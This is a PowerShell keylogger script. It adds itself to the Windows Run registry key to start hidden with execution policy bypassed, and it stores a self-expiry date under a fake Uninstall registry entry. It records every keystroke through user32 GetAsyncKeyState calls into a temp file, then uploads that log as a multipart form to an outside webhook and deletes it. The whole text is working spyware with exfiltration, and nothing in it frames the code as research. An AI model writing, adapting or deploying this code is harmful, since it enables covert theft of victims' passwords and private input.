if($DaysRun -eq -1 -or $DaysRun -gt 0){
    if(Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\txtlog'){ return };

    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun  + '$DaysRun=' + $DaysRun +  ';Get-Item txtlog.ps1 | Invoke-Expression;sleep 5;exit'); 
    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'txtlog' -Value $autostart;

    if($DaysRun -eq -1){ return };
    if(Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\txtlog'){ return };

    $date = (Get-Date).AddDays($daysRun);
    New-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\txtlog' -Force;
    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\txtlog' -Name 'date' -Value $date;
}

if($DaysRun -gt 0){
    $date = Get-Date;
    $targetValue = Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\txtlog' -Name 'date';
    $targetDate = [DateTime]$targetValue.date;

    if($date -lt $targetDate){ return }

    Remove-Item "$env:temp\txtlog.ps1" -Force;
    Remove-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\txtlog' -Force
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Force
}

Do{
    $getT = Get-Date;
    $end = $getT.AddMinutes($RunTime);
    
    function Start-Key($Path="$env:temp\klog.txt"){
        $sigs = "
            [DllImport(`"user32.dll`", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode);
            [DllImport(`"user32.dll`", CharSet=CharSet.Auto)] public static extern int GetKeyboardState(byte[] keystate);
            [DllImport(`"user32.dll`", CharSet=CharSet.Auto)] public static extern int MapVirtualKey(uint uCode, int uMapType);
            [DllImport(`"user32.dll`", CharSet=CharSet.Auto)] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
        ";

        $API = Add-Type -MemberDefinition $sigs -Name "Win32" -Namespace API -PassThru;

        New-Item -Path $Path -ItemType File -Force;

        try{
            $rnnr = 0;

            while ($TimesRun -ge $rnnr){
                while ($end -ge $getT){

                    Start-Sleep -Milliseconds 30;

                    for($ascii = 9; $ascii -le 254; $ascii++){
                        $state = $API::GetAsyncKeyState($ascii);
                        if($state -eq -32767){
                            $null = [console]::CapsLock;
                            $virtualKey = $API::MapVirtualKey($ascii, 3);
                            $kbstate = New-Object Byte[] 256;
                            
                            $API::GetKeyboardState($kbstate);
                            
                            $mychar = New-Object -TypeName System.Text.StringBuilder;
                            $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0);
                            if($success){
                                [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode);
                            }
                        }
                    }

                    $getT = Get-Date;
                };

                Start-Sleep 1; 

                $fileBytes = [System.IO.File]::ReadAllBytes($Path);
                $fileContent =  [System.Text.Encoding]::GetEncoding("UTF-8").GetString($fileBytes);
                $boundary = [System.Guid]::NewGuid().ToString();
                $LF = "`r`n";

                $data = @{
                    "username" = $env:COMPUTERNAME;
                    "content" = "$env:COMPUTERNAME keylog";
                    "attachments" = @(
                        @{
                            "id" = 0;
                            "description" = "$env:COMPUTERNAME keylog";
                            "filename" = "$env:COMPUTERNAME-keylog.txt";
                        }
                    )
                } | ConvertTo-JSON;

                $body = (
                    "--$boundary",
                    "Content-Disposition: form-data; name=`"payload_json`"",
                    "Content-Type: application/json$LF",
                    $data,
                    "--$boundary",
                    "Content-Disposition: form-data; name=`"files[0]`"; filename=`"$env:COMPUTERNAME-keylog.txt`"",
                    "Content-Type: text/plain$LF",
                    $fileContent,
                    "--$boundary--$LF"
                ) -join $LF;

                Invoke-WebRequest -Uri $Hook -ContentType ("multipart/form-data; boundary=$boundary") -Method Post -Body $body;
                Remove-Item -Path $Path -force;
            }
        }finally{}
    }
    Start-Key;
}While ($a -le 5);